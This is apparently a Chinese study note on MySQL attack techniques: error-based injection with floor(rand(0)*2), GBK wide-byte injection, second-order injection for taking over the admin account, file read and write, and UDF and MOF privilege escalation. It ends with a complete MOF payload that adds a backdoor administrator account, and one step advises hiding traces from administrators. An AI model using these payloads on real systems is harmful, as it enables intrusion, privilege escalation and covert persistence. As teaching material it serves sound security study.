# floor+rand

floor() : 向下取整

rand() : 0-1 生成随机数（*2 就变成了 0-2 生成随机数）[根据当前数据表中的字段来生成随机数]

group by : 用来给数据分组

count(*) : 用来统计个数

<mark style="background: #FF5582A6;">floor(rand()*2)</mark>

  • 很明显是没有规律的

<mark style="background: #FF5582A6;">floor(rand(0)*2)</mark>

为什么 rand (0) 后变的有规律了？

因为使用了固定的随机数种子 0，每次产生的随机数列都是相同的顺序（当然，这个 0 也不是固定的，也可以尝试其他数字）

<mark style="background: #FF5582A6;">group by + count(*)</mark>

报错原理

当查询时使用了 rand () 的话，该值就会被计算很多次，使用 group by 的时候 floor (rand (0)*2) 会被多计算一次，也就是当使用了 floor (rand (0)*2) 的时候计算一次

MySQL 执行该语句时 <span style="background:#b1ffff"> 首先会建立一个虚表 </span>（该虚表有两个字段组成，一个是分组的 key，一个是计数值 count (*)），group by 进行分组时，floor (rand (0)*2) 会多执行一次，触发执行一次的条件为，虚表不存在该分组，那么在插入新分组的时候 floor (rand (0)*2) 就计算了一次，根据 floor (rand (0)*2) 的确定性（011011 的顺序）来进行插入

011011011…………

  1. 首先遇到第一个值 "0"，发现 "0" 不在虚表中，则需要插入分组，此时 floor (rand (0)*2) 会计算一次，从而变成第二个值 "1"，即第一个插入 key 的值由 0 变成了第二个值 1
  2. 查看第二个值是 "1"，存在虚表中，count 计数加 1
  3. 遇到第三个值 "1"，发现 "1" 存在虚表中，count 计数加 1
  4. 此时虚表中 1 值个数由 1 变为 2
  5. 当遇到第四个值 "0"，发现 0 不存在虚表中，则需要插入分组，此时 floor (rand (0)*2) 又会计算一次，从而变成第五个值 "1"
  6. 此时往虚表中插入分组 1，发现分组 1 存在于虚表中，则发生报错

在虚表中写入三条记录时，产生了报错，此时 floor (rand (0)*2) 一共被计算了 5 次，这也说明了为什么数据表最少有 3 条数据才会报错

# 编码介绍

ascii、gbk 和 utf-8 编码

  1. ascii : 一个字节
  2. gbk : 两个字节
  3. utf-8 : 三个字节

gbk 编码（双字节编码） : 一个汉字用两个字节表示（首字节对应 0x81-0xFE、尾字节对应 0x40-0xFF、转移字符为 0x5c）

# 原理

如果说 PHP 的编码为 UTF-8 而 MySQL 的编码设置为 SET NAMES 'gbk' 或者 SET character_set_client=gbk

这样配置会引起编码转换从而导致漏洞的产生。

这里要说明一小点的是 SET NAMES 'x' 语句与这三个语句等价

也就是说你设置了 SET NAMES 'x' 时就等于同时执行了上面的 3 条语句，我理解的宽字节注入就是 php 发送请求到 MySQL 时使用了语句， SET NAMES 'gbk' 或者 SET character_set_client =gbk , 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节的注入。

根本原因 ：<span style="background:#b1ffff">character_set_client（客户端字符集）和 character_set_connection（连接层的字符集）不同 </span>，或转换函数如 <span style="background:#b1ffff">iconv,mb_convert_encoding 使用不当 </span>

# icon 转换

为了避免漏洞，网站一般会设置 utf-8 编码，然后进行转义过滤，但是由于一些不经意的字符集转换，优惠导致漏洞

使用 <mark style="background: #FF5582A6;">set name UTF-8</mark> 指定 utf-8 字符集，并且也使用转义函数进行转义，有时候，为了避免乱码，会将一些用户提交的 GBK 字符使用 iconv () 函数先转为 UTF-8，然后再拼接 SQL 语句

<span style="background:#b1ffff">% e5%5c</span> 是 gbk 编码，转换为 UTF-8 编码是 <span style="background:#b1ffff">% e9%8c% a6</span>

% e5%5c%27 首先从 gbk 编码经过 addslashes 函数之后变成 % e5%5c%5c%5c%27，再通过 iconv () 将其转换为 UTF-8 编码，% e9%8c% a6%5c%5c%27 ，其中 % e9%8c% a6 是汉字，%5c%5c%27 解码之后是 \' 第一个 \ 将第二个 \ 转义，使得 %27 单引号逃逸，成功闭合语句

# 二次排序注入

二次排序注入也成为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以出发 sql 注入。

先注册账号（admin' #） => 修改密码（admin' #） => 设置新密码 => 账号名经过 SQL 语句更新时变成了 admin 账号

  1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务 端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。
  2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的 数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响 应。
  3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。
  4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库 中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服 务端环境中执行。
  5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注 入漏洞利用是否成功。

此例子中我们的步骤是注册一个 admin’# 的账号，接下来登录该帐号后进行修改密码。此时 修改的就是 admin 的密码。 SQL 语句变为 <mark style="background: #FF5582A6;">UPDATE users SET passwd="New_Pass" WHERE username =' admin' # ' AND password='</mark>
也就是执行了 <mark style="background: #FF5582A6;">UPDATE users SET passwd="New_Pass" WHERE username =' admin'</mark>

  • 通过修改 my.ini 文件，添加：secure-file-priv=
  • 启动项添加参数：mysqld.exe --secure-file-priv=

修改完成后便重启

# 读文件

限制 ：

  • 前两种需要 secure-file-priv 无值或为有利目录。
  • 都需要知道要读取的文件所在的绝对路径。
  • 要读取的文件大小必须小于 max_allowed_packet 所设置的值 show VARIABLES like '%max_allowed_packet%';

local data infile 和 local data local infile 的区别

  • load data infile：只能在 MySQL 服务器上执行，且需要文件存放到指定位置，可以使用 show variables like ‘% secure%’; 查看
  • load data local infile：可以在本地执行

# 写文件

限制：

  • secure-file-priv 无值或为可利用的目录
  • 需知道目标目录的绝对目录地址
  • 目标目录可写，mysql 的权限足够。
  • into outfile 是导出所有数据，适合导出库
  • into dumpfile 只能导出一行数据

  • 权限够，可以进行日志的设置操作

# windows-UDF 提权

  • 用户自定义函数提权

# 原理

UDF 用户自定义函数，通过添加新的函数，对 mysql 服务器进行功能扩充

# 利用条件

  1. MySQL 版本大于 5.1，udf.dll 文件必须存放在 mysql 的安装路径下的 MySQL\Lib\Plugin 文件夹中，该目录默认是不存在的，需要使用 webshell 找到 mysql 的安装路径，并在该路径下创建 MySQL\Lib\Plugin 文件夹，将 dll 文件导入该目录

  2. 如果 MySQL 版本小于 5.1，udf.dll 文件在 windows server 2003 下放置于 c:\windows\system32\ 下，Windows server 2000 放置于 c:\winnt\system32 目录下

  3. 管理员权限，对 MySQL 拥有读写删除权限

# 提权思路

  1. 在 sqlmap 的 data/udf/mysql 目录下，在 Windows 目录中有 32 位和 64 位的 dll 文件，文件夹的 dll 文件是通过异或编码的，可以使用 sqlmap/extract/cloak.py 解码

  2. 将解码后的 dll 文件上传到可写目录，再倒入到 Mysql 可识别目录中

  1. 将 DLL 中的函数引入到 MySQL 数据库中创建自定义函数
  1. 使用该函数去执行系统命令提权，查看当前用户权限
  1. 将之前引入的函数删除掉，防止被管理员发现，防止其他攻击者使用（在此之前可以创建用户后在删除）

# linux-UDF 提权

# 原理

通过自定义库函数来实现执行任意的命令，包含用户自定义函数的文件为.so 文件

# 利用条件

  1. 在 my.ini 的 [mysqld] 下，添加 secure_file_priv=""，不限制导入导出路径
  2. 具有数据库 root 账户的密码，且 mysql 数据库以 root 权限运行
  3. 具有 sql 语句的执行权限
  4. 导出目录可写
  5. 系统中的 selinux 处于关闭状态

# 提权思路

  1. 查找插件库的路径

  1. 找到对应操作系统数据库的 UDF 库文件 sqlmap-master\data\udf\mysql\linux\64 下的 lib_mysqludf_sys.so_ 文件

  2. 将 so 文件（UDF 库文件）进行 16 进制编码

  3. 将 so 文件的内容解码，写入到 mysql 插件库目录中

  1. 查看 udf 库所支持的函数

需要创建.so 文件中存在的函数，可以使用十六进制编辑器打开.so 文件，查看可以被创建的函数。

  1. 创建函数

写入之后，执行创建函数的命令，就会创建一个 sys_eval 的函数，用来执行系统命令，这个函数执行的系统命令全部都是 system 权限。

  1. 执行系统命令，提权

sys_eval 这个函数就可以执行系统命令，括号里输入系统命令即可。

# MOF 提权

# 原理

  1. 利用了 c:\windows\system32\wbem\MOF 目录下的 nullevt.mof 文件
  2. 利用该文件每分钟去执行一次的特性，向该文件写入 cmd 命令就会被执行

# 利用条件

  1. 只适用于 windows 系统，比较低的版本适用（xp、2003 等）
  2. 对 c:\windows\system32\wbem\MOF 有读写权限
  3. 对服务器存在一个可写目录，写入 mof 文件

# 提权思路

  1. 在可写目录上传 mof 文件，把 mof 文件上传到 c:\wmpub\nullevt.mof
  2. 将这个文件复制到 c:\windows\system32\wbem\MOF\nullevt.mof 目录下
  1. 将下面代码复制到 mof 文件中
#pragma namespace("\\\\.\\root\\subscription") 

instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
}; 

instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin123!@# /add\")"; 
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};
  1. 之后会自动创建一个 admin 用户
